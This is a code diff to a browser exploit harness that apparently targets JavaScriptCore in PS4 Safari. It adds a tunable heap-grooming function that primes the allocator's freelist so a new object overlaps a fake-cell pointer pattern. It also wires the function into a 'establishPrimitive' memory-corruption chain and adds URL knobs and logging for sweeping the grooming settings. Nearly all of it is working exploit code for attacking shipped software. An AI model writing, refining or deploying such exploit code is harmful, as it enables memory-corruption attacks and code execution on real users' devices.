@@ -12,6 +12,10 @@
 //   ?g=slab:0xN           slab size   (default 0x800000)
 //   ?g=pred:0xN           predecessor (default 0xa0000)
 //
+// beforeCriticalLoad tuning:
+//   ?nudge=N              number of cells to alloc/free (default 4)
+//   ?shape=obj|arr|u8|num which cell shape to use (default obj)
+//
 // One cold boot per attempt. maxAttempts is 1 by design -- retries in
 // the same renderer reuse the previous attempt's heap and fail.
 
@@ -76,6 +80,80 @@ function i64ToNum(v) { return (v.hi >>> 0) * 0x100000000 + (v.low >>> 0); }
 const SYS = { socket: 0x61, close: 6, getpid: 20, getuid: 0x18 };
 const AF_UNIX = 1, SOCK_STREAM = 1, AF_INET6 = 28;
 
+// ---------------------------------------------------------------------------
+// beforeCriticalLoad -- JSC heap nudger.
+//
+// Called from inside core.js's runGroomAndLoad AFTER the predecessor has
+// been filled with fake-cell pointers and BEFORE the second postMessage
+// detaches the holes and loadHistoryCritical runs.
+//
+// The goal: prime the JSC MarkedBlock freelist with freed cells whose
+// payload bytes (still whatever was in the predecessor page) are at the
+// head, so the fresh JSObject the SSV allocates for outerGraph[2] lands
+// on top of the fakeAddress pattern.
+//
+// Two knobs from the URL:
+//   nudge=N   number of cells to allocate then free (LIFO freelist order)
+//   shape=X   obj | arr | u8 | num -- cell shape to prime with
+//
+// Empirical -- the right N and shape depend on the JSC build. Sweep.
+// ---------------------------------------------------------------------------
+function beforeCriticalLoad(fakeAddress, targetAddress) {
+    const K = (() => {
+        const v = params.get("nudge");
+        if (v == null) return 4;
+        const n = parseInt(v, 10);
+        return Number.isFinite(n) && n > 0 && n <= 256 ? n : 4;
+    })();
+    const SHAPE = (params.get("shape") || "obj").toLowerCase();
+
+    // Allocate a run of cells with a known size class. Their exact contents
+    // do not matter -- what matters is that when we drop the array, JSC
+    // pushes each cell onto the MarkedBlock freelist in reverse order, so
+    // the last one allocated becomes the next one handed out.
+    const nudge = [];
+    for (let i = 0; i < K; ++i) {
+        if (SHAPE === "obj") {
+            // Same shape as referenceTarget in core.js:
+            //   { marker: <int32>, kind: <interned string> }
+            // 0x20-byte inline storage, 2 slots.
+            nudge.push({ marker: (0x41414141 + i) | 0, kind: "nudge" });
+        } else if (SHAPE === "arr") {
+            // Dense array of small ints. Different size class than obj.
+            nudge.push([i, i, i, i, i, i, i, i]);
+        } else if (SHAPE === "u8") {
+            // Small typed-array backing store. Much larger cell footprint.
+            nudge.push(new Uint8Array(0x10));
+        } else if (SHAPE === "num") {
+            // HeapNumber. Smallest allocatable cell.
+            nudge.push(i * 1.1);
+        } else {
+            nudge.push({ marker: (0x41414141 + i) | 0, kind: "nudge" });
+        }
+    }
+
+    // Drop the run. JSC's MarkedBlock free list is LIFO, so the cells just
+    // freed are now the head of the list. If the predecessor page landed
+    // in the same MarkedBlock as these cells, the next SSV allocation for
+    // outerGraph[2] will hand out a slot whose payload region overlaps the
+    // fakeAddress pattern.
+    nudge.length = 0;
+
+    // Optional consolidation. gc is usually not exposed on PS4 Safari,
+    // so this is a no-op there, but leaving it in costs nothing.
+    if (typeof globalThis.gc === "function") {
+        try { globalThis.gc(); } catch { }
+    }
+
+    // Diagnostic. Goes to the dev console only -- we cannot use emit() here
+    // because onEvent is owned by core.js and the load hasn't happened yet.
+    try {
+        console.log(`[beforeCriticalLoad] K=${K} shape=${SHAPE}`
+            + ` fake=0x${(fakeAddress >>> 0).toString(16)}`
+            + ` target=0x${(targetAddress >>> 0).toString(16)}`);
+    } catch { }
+}
+
 window.addEventListener("error", (ev) => {
     if (isMemoryError(ev && ev.error ? ev.error : ev && ev.message)) {
         markColdBoot("window-error:" + (ev.message || "unknown"));
@@ -101,9 +179,15 @@ window.addEventListener("unhandledrejection", (ev) => {
         mark("FW", navigator.userAgent);
         mark("FW-KEY", key || "unknown");
 
+        // Emit the nudge config so it shows up at the top of every log.
+        mark("NUDGE-CFG",
+             "nudge=" + (params.get("nudge") || "4")
+             + " shape=" + (params.get("shape") || "obj"));
+
         try {
             carrier = await establishPrimitive({
                 maxAttempts: 1,
+                beforeCriticalLoad: beforeCriticalLoad,
                 onEvent: (t, d) => {
                     mark(t, d || "");
                     const s = String(d || "").toLowerCase();
